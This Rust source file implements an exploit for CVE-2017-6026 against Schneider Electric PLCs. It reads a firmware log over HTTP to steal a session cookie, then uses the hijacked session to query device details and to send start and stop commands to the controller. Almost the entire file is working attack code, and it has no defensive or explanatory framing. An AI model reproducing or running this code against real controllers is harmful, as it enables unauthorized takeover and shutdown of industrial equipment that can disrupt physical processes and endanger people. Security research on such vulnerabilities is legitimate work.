use std::time::Duration;

#[derive(Debug, Clone)]
pub struct SchneiderSession {
    pub cookie_value: String,
    pub power_on_count: u32,
}

#[derive(Debug, Clone)]
pub struct SchneiderDeviceInfo {
    pub device: String,
    pub mac: String,
    pub firmware: String,
    pub state: String,
}

/// Retrieve the session cookie from the FwLog.txt (CVE-2017-6026). Pass `port = 0` for default (80).
pub fn get_session_cookie(target_ip: &str, port: u16) -> Option<SchneiderSession> {
    let effective_port = if port == 0 { 80 } else { port };
    let url = format!("http://{target_ip}:{effective_port}/usr/Syslog/FwLog.txt");
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout_read(Duration::from_secs(10))
        .build();

    let body = match agent.get(&url).call() {
        Ok(r) => if let Ok(s) = r.into_string() { s } else {
            println!("Error reading FwLog response.");
            return None;
        },
        Err(e) => {
            println!("Error fetching FwLog: {e}");
            return None;
        }
    };

    let mut power_on_count = 0u32;
    let mut cookie_val = None;

    for line in body.lines() {
        if line.contains("Firmware core2") {
            power_on_count += 1;
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(val) = parts.get(1) {
                cookie_val = Some((*val).to_string());
            }
        }
    }

    let cookie_value = cookie_val?;

    Some(SchneiderSession {
        cookie_value,
        power_on_count: power_on_count / 2,
    })
}

/// Use the hijacked session to get device info. Pass `port = 0` for default (80).
pub fn get_device_info(
    target_ip: &str,
    port: u16,
    cookie_value: &str,
    username: &str,
) -> Option<SchneiderDeviceInfo> {
    let effective_port = if port == 0 { 80 } else { port };
    let url = format!("http://{target_ip}:{effective_port}/plcExchange/getValues/");
    let post_data = "S;100;0;136;s;s;S;2;0;24;w;d;S;1;0;8;B;d;S;1;0;9;B;d;S;1;0;10;B;d;S;1;0;11;B;d;";

    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout_read(Duration::from_secs(10))
        .build();

    for user in &[username, "USER"] {
        let cookie = format!("M258_LOG={user}:{cookie_value}");
        let result = agent
            .post(&url)
            .set("Cookie", &cookie)
            .send_string(post_data);

        match result {
            Ok(resp) => {
                let data = resp.into_string().unwrap_or_default();
                let parts: Vec<&str> = data.split(';').collect();
                let state_map = |s: &str| match s {
                    "0" => "ERROR",
                    "1" => "Stopped",
                    "2" => "Running",
                    _ => "Unknown",
                };
                let state = state_map(parts.get(1).copied().unwrap_or("")).to_string();
                let firmware = if parts.len() >= 6 {
                    parts[2..6].join(".")
                } else {
                    "Unknown".to_string()
                };

                let device_part = data.split(';').next().unwrap_or("").to_string();
                let mac = device_part
                    .split_whitespace()
                    .nth(1).map_or_else(|| "Unknown".to_string(), |s| s.trim_start_matches('[').to_string());

                let info = SchneiderDeviceInfo {
                    device: device_part.split_whitespace().next().unwrap_or("").to_string(),
                    mac,
                    firmware,
                    state,
                };

                println!("SUCCESS ({user})");
                println!("  Device:     {}", info.device);
                println!("  MAC:        {}", info.mac);
                println!("  Firmware:   {}", info.firmware);
                println!("  Controller: {}", info.state);
                return Some(info);
            }
            Err(_) => {
                println!("Auth failed for user '{user}'");
            }
        }
    }
    None
}

/// Send start or stop command via hijacked session. Pass `port = 0` for default (80).
pub fn control_plc(
    target_ip: &str,
    port: u16,
    cookie_value: &str,
    username: &str,
    action: &str,
) -> bool {
    if target_ip.parse::<std::net::Ipv4Addr>().is_err() {
        println!("Invalid target IP: {target_ip}");
        return false;
    }
    let safe_action = match action {
        "start" | "stop" => action,
        other => {
            println!("Unsupported action '{other}'. Use 'start' or 'stop'.");
            return false;
        }
    };
    let effective_port = if port == 0 { 80 } else { port };
    let cookie = format!("M258_LOG={username}:{cookie_value}");
    let url = format!("http://{target_ip}:{effective_port}/plcExchange/command/{safe_action}");
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout_read(Duration::from_secs(10))
        .build();

    match agent.post(&url).set("Cookie", &cookie).call() {
        Ok(_) => {
            println!("Controller {action} command sent.");
            true
        }
        Err(e) => {
            println!("Failed to {action} controller: {e}");
            false
        }
    }
}

